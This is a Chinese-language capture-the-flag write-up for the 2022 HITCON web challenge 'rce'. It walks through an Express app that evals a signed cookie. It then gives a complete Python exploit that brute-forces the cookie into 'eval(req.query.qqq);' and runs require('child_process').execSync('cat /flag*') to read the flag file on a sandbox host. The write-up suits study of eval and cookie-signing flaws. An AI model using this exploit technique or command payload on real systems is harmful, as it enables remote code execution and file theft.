::: info
2022-HitCon-Web-rce
:::

# 1、思路

本地部署：`npm install`，`node app.js`（⚠️：端口占用时修改监听端口）

（1）`Dockerfile` 保存 flag到文件中，生成一个随机的文件名，该文件名以 `/flag-` 开头，后接 32 字节的随机数据的 SHA1 哈希值

```dockerfile
RUN echo "hitcon{REDACTED}" > "/flag-$(head -c 32 /dev/random | sha1sum | cut -d ' ' -f 1 | tr -d '\n')"
```

（2）`index.html` 当点击按钮时，执行代码

- `progress.max = 40;`：设置进度条的最大值为40。
- `RCE.disabled = true;`：禁用名为“RCE”的按钮，防止用户重复点击。
- `while (true) {...}`：无限循环，直到条件被破坏。
- `const data = await fetch("/random").then(r => r.json());`：从服务器获取数据，该数据是从 `/random` 端点获取的 JSON 格式数据。使用 `fetch` 函数发送 HTTP 请求，然后将响应转换为 JSON 格式。
- `progress.value = data.progress;`：将获取到的数据中的进度值设置为进度条的当前值。
- `if (data.result !== null) {...}`：如果获取到的数据中的结果不为 null，表示已经获取到了最终结果。
- `document.querySelector('.window-body').innerHTML = '<h3>' + data.result + '</h3>';`：将获取到的结果显示在网页中，具体显示在类名为 `window-body` 的 HTML 元素中，使用 `<h3>` 标签包裹，以确保以标题的形式显示。
- `break;`：跳出循环，停止继续执行。

```html
    <script>
        RCE.onclick = async () => {
            progress.max = 40;
            RCE.disabled = true;
            while (true) {
                const data = await fetch("/random").then(r => r.json());
                progress.value = data.progress;
                if (data.result !== null) {
                    document.querySelector('.window-body').innerHTML = '<h3>' + data.result + '</h3>';
                    break;
                }
            }
        }
    </script>
```

（3）`app.js` 中 `eval(code)` 会评估或者执行参数 code，`Buffer.from()` 方法用于创建包含指定字符串、数组或缓冲区的新缓冲区，因此 code 来自 `req.signedCookies.code`，Express 通过 `res.cookie` 设置 cookie 并返回 eval(code) 的结果值，**如果 cookie 的长度不足 40 位 16 进制即 20 字节，就会随机生成一位 16 进制直至达到 20 字节**，因此插入的恶意代码需要是 20 字节

```js
app.get('/', function (_, res) {
    res.cookie('code', '', { signed: true })
        .sendFile(__dirname + '/index.html');
});

app.get('/random', function (req, res) {
    let result = null;
    if (req.signedCookies.code.length >= 40) {
        const code = Buffer.from(req.signedCookies.code, 'hex').toString();
        try {
            result = eval(code);
        } catch {
            result = '(execution error)';
        }
        res.cookie('code', '', { signed: true })
            .send({ progress: req.signedCookies.code.length, result: `Executing '${code}', result = ${result}` });
    } else {
        res.cookie('code', req.signedCookies.code + randomHex(), { signed: true })
            .send({ progress: req.signedCookies.code.length, result });
    }
});
```

# 2、设置 cookie

## 20 字节恶意代码

`req.query` 用在 get 请求当中，`req.body` 是用在 post 请求中的

`req.query.xxx` 让我们能够路由到 `/random?xxx=

- `eval(req.query.qqq);`

由于 20 字节需要转换为 16 进制，所以 `eval(req.query.qqq);` => `6576616c287265712e71756572792e717171293b`

## cookie 格式

```python
s = requests.get(url="http://challenge-9591aa6dad50d3ca.sandbox.ctfhub.com:10800")
print(s.headers["Set-Cookie"])
// code=s%3A.2iFEryA%2BlXkG5krFOVq9H%2F4Pyh2DTm0ynvM%2BucCDHQM; Path=/
```

但 `requests.get` 中的 cookies 参数是 dict，因此需要满足格式 `{'code': '', 'Path': '/'}`，其中 code 的格式是在 s%3A 后面逐渐加随机数的，. 后面为其它数据

```python
def process_cookie(text):
    pairs = text.split('=')
    cookie_dict: dict = {
        'code': pairs[1].split(';')[0],
        'Path': '/'
    }
    return cookie_dict
```

保存每次的 cookie 循环访问 /random 以增加至 40 位 16 进制，并确保与恶意代码逐字一致（取最新生成的一位，即 . 前一位），因此至多遍历 16 $\times$ 40 次

```python
def get_cookie(text):
  return text.split('.')[0][-1]


url = "http://challenge-9591aa6dad50d3ca.sandbox.ctfhub.com:10800/random"
cookies = process_cookie(s.headers["Set-Cookie"])

insert = "6576616c287265712e71756572792e717171293b"  # eval(req.query.qqq);
i = 0
while i < len(insert):
  s = request.get(url=url, cookies=cookies)
  if get_cookie(s.headers["Set-Cookie"]) == insert[i]:
    cookies = s.headers["Set-Cookie"]
    i = i + 1
```

## 执行系统命令

Node.js 中使用 child_process 模块执行系统命令，并将结果转换为字符串

```python
command = 'require("child_process").execSync("cat /flag*").toString()'
s = requests.get(url=url+f"?qqq={command}",cookies=cookies)
print(s.text)
```

# 3、exp

```python
import requests


def get_cookie(text):
    return text.split('.')[0][-1]


def process_cookie(text):
    pairs = text.split('=')
    cookie_dict: dict = {
        'code': pairs[1].split(';')[0],
        'Path': '/'
    }
    return cookie_dict


s = requests.get(url="http://challenge-9591aa6dad50d3ca.sandbox.ctfhub.com:10800")
cookies = process_cookie(s.headers["Set-Cookie"])

url = "http://challenge-9591aa6dad50d3ca.sandbox.ctfhub.com:10800/random"
insert = "6576616c287265712e71756572792e717171293b"  # eval(req.query.qqq);
i = 0
while i < len(insert):
    s = requests.get(url=url, cookies=cookies)
    if get_cookie(s.headers["Set-Cookie"]) == insert[i]:
        cookies = process_cookie(s.headers["Set-Cookie"])
        print(cookies)
        i = i + 1

command = 'require("child_process").execSync("cat /flag*").toString()'
s = requests.get(url=url+f"?qqq={command}",cookies=cookies)
print(s.text)
```

